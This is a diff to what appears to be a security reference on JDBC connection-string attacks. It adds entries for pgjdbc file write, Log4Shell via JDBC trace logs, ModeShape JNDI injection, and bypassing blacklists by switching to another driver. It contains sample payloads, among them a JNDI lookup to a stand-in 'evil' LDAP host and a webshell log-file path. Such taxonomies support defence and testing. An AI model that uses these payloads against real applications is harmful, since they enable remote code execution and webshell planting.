@@ -77,7 +77,7 @@ The driver supports pluggable socket and SSL factory classes specified via URL p
 
 | Subtype | Property | Constructor Arg Property | Exploitable With |
 |---|---|---|---|
-| **socketFactory** | `socketFactory={class}` | `socketFactoryArg={arg}` | Spring `ClassPathXmlApplicationContext` |
+| **socketFactory** | `socketFactory={class}` | `socketFactoryArg={arg}` | Spring `ClassPathXmlApplicationContext` (RCE); `java.io.FileOutputStream` (arbitrary file write via path in `socketFactoryArg`) |
 | **sslfactory** | `sslfactory={class}` | `sslfactoryarg={arg}` | Any single-string-arg constructor class |
 | **sslhostnameverifier** | `sslhostnameverifier={class}` | N/A | Classes with no-arg or single-arg constructors |
 
@@ -102,6 +102,7 @@ In very old pgjdbc versions, `loggerLevel` and `loggerFile` properties allow wri
 | Subtype | Mechanism | Key Condition |
 |---|---|---|
 | **Log File Write** | `loggerLevel=DEBUG&loggerFile=/path/to/webshell.jsp` | Writable path, old pgjdbc versions |
+| **Log4Shell via JDBC Log Injection** | JNDI payloads embedded in connection parameters (e.g., `${jndi:ldap://evil/obj}` in database name or property values) are written to the JDBC trace log file. If Log4j2 subsequently processes that log file (or the same log sink), the JNDI expressions trigger remote class loading and code execution — a two-stage chain combining JDBC log write with Log4j evaluation | `loggerLevel=TRACE` + Log4j2 on classpath processing the same log output |
 
 **Patch**: CVE-2022-21724 was fixed in pgjdbc 42.2.25 / 42.3.2 by adding interface verification before instantiation.
 
@@ -201,7 +202,7 @@ When an application constructs JDBC URLs from user input but only validates the 
 
 ---
 
-## §5. JNDI Injection via Driver Properties (DB2, Informix, H2)
+## §5. JNDI Injection via Driver Properties (DB2, Informix, H2, ModeShape)
 
 Several JDBC drivers perform JNDI lookups using connection property values. If an attacker controls these values, they can redirect lookups to malicious LDAP/RMI servers for remote class loading and code execution.
 
@@ -231,6 +232,14 @@ The IBM Informix JDBC driver performs JNDI lookups when certain connection strin
 | Subtype | Mechanism | CVE |
 |---|---|---|
 | **krbJAASFile Injection** | `krbJAASFile` property references attacker-controlled JAAS config | CVE-2024-49194 |
+
+### §5-4. ModeShape JCR JNDI Injection
+
+ModeShape (Java Content Repository implementation) supports JNDI lookups in its JDBC-style connection URLs, enabling the standard JNDI injection → deserialization RCE chain.
+
+| Subtype | Mechanism | Key Condition |
+|---|---|---|
+| **Connection URL JNDI Lookup** | ModeShape connection URL triggers `InitialContext.lookup()` with attacker-controlled LDAP/RMI endpoint, enabling remote class loading and code execution | Attacker controls ModeShape/JCR connection URL; exploitable gadgets on classpath |
 
 ---
 
@@ -357,6 +366,7 @@ When applications construct JDBC URLs from user input, attackers can inject addi
 | **Property Override** | Later duplicate parameter overrides earlier | `?autoDeserialize=false&autoDeserialize=true` |
 | **URL Fragment/Userinfo** | Inject via `@` (userinfo) or `#` (fragment) in URL | `jdbc:mysql://user:pass@evil-host/db` |
 | **IPv6 Bracket Abuse** | Use `[::1]` or IPv6 brackets to bypass host validation | `jdbc:postgresql://[::1]/db` |
+| **Alternative Driver Exploitation** | When target driver properties are blacklisted, switch to an alternative JDBC driver with unfiltered attack surface. `com.mysql.fabric.jdbc.FabricMySQLDriver` contains XML parsing with XXE vulnerabilities, bypassing MySQL Connector/J blacklists. WebLogic's `ApplicationName` property accepts EL expressions, enabling JSP webshell write and credential extraction via reflection | Alternative driver on classpath; WebLogic application server |
 
 ---
 
